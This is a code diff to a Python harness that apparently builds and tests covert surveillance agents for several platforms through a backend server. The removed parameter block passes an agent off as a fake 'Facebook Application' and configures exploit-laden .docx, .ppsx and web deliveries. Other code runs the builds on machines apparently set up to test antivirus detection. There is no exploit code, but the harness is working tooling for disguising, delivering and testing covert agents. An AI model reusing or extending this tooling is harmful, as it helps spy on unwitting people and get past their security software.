@@ -118,7 +118,7 @@ class connection:
 class AgentBuild:
 
     def __init__(self, backend, frontend=None, platform='windows', kind='silent',
-                 ftype='desktop', blacklist=[]):
+                 ftype='desktop', blacklist=[], param = None):
         self.kind = kind
         self.host = (backend, frontend)
         if "winxp" in socket.gethostname():
@@ -131,6 +131,7 @@ class AgentBuild:
         self.blacklist = blacklist
         self.platform = platform
         self.ftype = ftype
+        self.param = param
         logging.debug("DBG blacklist: %s" % self.blacklist)
         logging.debug("DBG hostname: %s" % self.hostname)
 
@@ -194,72 +195,9 @@ class AgentBuild:
 
     def _build_agent(self, factory, melt=None, demo=False, tries=0):
         with connection() as c:
-            params = {}
-            params['blackberry'] = {
-                'platform': 'blackberry',
-                'binary': {'demo': demo},
-                'melt': {'appname': 'facebook',
-                         'name': 'Facebook Application',
-                         'desc': 'Applicazione utilissima di social network',
-                         'vendor': 'face inc',
-                         'version': '1.2.3'},
-                'package': {'type': 'local'}}
-
-            params['windows'] = {
-                'platform': 'windows',
-                'binary': {'demo': demo, 'admin': False},
-                'melt': {'scout': True, 'admin': False, 'bit64': True, 'codec': True},
-                'sign': {}
-                }
-            params['android'] = {
-                'platform': 'android',
-                'binary': {'demo': demo, 'admin': False},
-                'sign': {},
-                'melt': {}
-                }
-            params['linux'] = {
-                'platform': 'linux',
-                'binary': {'demo': demo, 'admin': False},
-                'melt': {}
-                }
-            params['osx'] = {'platform': 'osx',
-                             'binary': {'demo': demo, 'admin': True},
-                             'melt': {}
-                             }
-            params['ios'] = {'platform': 'ios',
-                             'binary': {'demo': demo},
-                             'melt': {}
-                             }
-
-            params['exploit'] = {"generate":
-                                 {"platforms": ["windows"], "binary": {"demo": False, "admin": False}, "exploit": "HT-2012-001",
-                                  "melt": {"demo": False, "scout": True, "admin": False}}, "platform": "exploit", "deliver": {"user": "USERID"},
-                                 "melt": {"combo": "txt", "filename": "example.txt", "appname": "agent.exe",
-                                          "input": "000"}, "factory": {"_id": "000"}
-                                 }
-
-            params['exploit_docx'] = {"generate":
-                                      {"platforms": ["windows"], "binary": {"demo": False, "admin": False}, "exploit": "HT-2013-002",
-                                       "melt": {"demo": False, "scout": True, "admin": False}},
-                                      "platform": "exploit", "deliver": {"user": "USERID"},
-                                      "melt": {"filename": "example.docx", "appname": "APPNAME", "input": "000", "url": "http://HOSTNAME/APPNAME"}, "factory": {"_id": "000"}
-                                      }
-            params['exploit_ppsx'] = {"generate":
-                                      {"platforms": ["windows"], "binary": {"demo": False, "admin": False}, "exploit": "HT-2013-003",
-                                       "melt": {"demo": False, "scout": True, "admin": False}},
-                                      "platform": "exploit", "deliver": {"user": "USERID"},
-                                      "melt": {"filename": "example.ppsx", "appname": "APPNAME", "input": "000", "url": "http://HOSTNAME/APPNAME"}, "factory": {"_id": "000"}
-                                      }
-            params['exploit_web'] = {"generate":
-                                     {"platforms": ["windows"], "binary": {"demo": False, "admin": False}, "exploit": "HT-2013-002",
-                                      "melt": {"demo": False, "scout": True, "admin": False}},
-                                     "platform": "exploit", "deliver": {"user": "USERID"},
-                                     "melt": {"filename": "example.docx", "appname": "APPNAME", "input": "000", "url": "http://HOSTNAME/APPNAME"}, "factory": {"_id": "000"}
-                                     }
-
-            param = params[self.platform]
 
             try:
+                # TODO: togliere da qui, metterla in procedures
                 filename = 'build/%s/build.zip' % self.platform
                 if os.path.exists(filename):
                     os.remove(filename)
@@ -267,14 +205,14 @@ class AgentBuild:
                 if melt:
                     logging.debug("- Melt build with: ", melt)
                     appname = "exp_%s" % self.hostname
-                    param['melt']['appname'] = appname
-                    param['melt']['url'] = "http://%s/%s/" % (c.host, appname)
-                    if 'deliver' in param:
-                        param['deliver']['user'] = c.myid
-                    r = c.build_melt(factory, param, melt, filename)
+                    self.param['melt']['appname'] = appname
+                    self.param['melt']['url'] = "http://%s/%s/" % (c.host, appname)
+                    if 'deliver' in self.param:
+                        self.param['deliver']['user'] = c.myid
+                    r = c.build_melt(factory, self.param, melt, filename)
                 else:
                     logging.debug("- Silent build")
-                    r = c.build(factory, param, filename)
+                    r = c.build(factory, self.param, filename)
 
                 contentnames = unzip(filename, "build/%s" % self.platform)
 
@@ -680,7 +618,7 @@ def execute_agent(args, level, platform):
     logging.debug("DBG ftype: %s" % ftype)
 
     vmavtest = AgentBuild(args.backend, args.frontend,
-                       platform, args.kind, ftype, args.blacklist)
+                       platform, args.kind, ftype, args.blacklist, args.param)
 
     """ starts a scout """
     if socket.gethostname() not in ['Zanzara.local', 'win7zenoav', "paradox"]:
@@ -762,7 +700,7 @@ def clean(args):
     vmavtest = AgentBuild(args.backend, args.frontend, args.kind)
     vmavtest._delete_targets(operation)
 
-def build(action, platform, kind, backend, frontend):
+def build(action, platform, kind, backend, frontend, params):
 
     platform_desktop = ['windows', 'linux', 'osx', 'exploit',
                         'exploit_docx', 'exploit_ppsx', 'exploit_web']
@@ -789,6 +727,7 @@ def build(action, platform, kind, backend, frontend):
     args.kind = kind
     args.backend = backend
     args.frontend = frontend
+    args.params = params
 
     args.blacklist=blacklist
     args.platform_type=platform_type
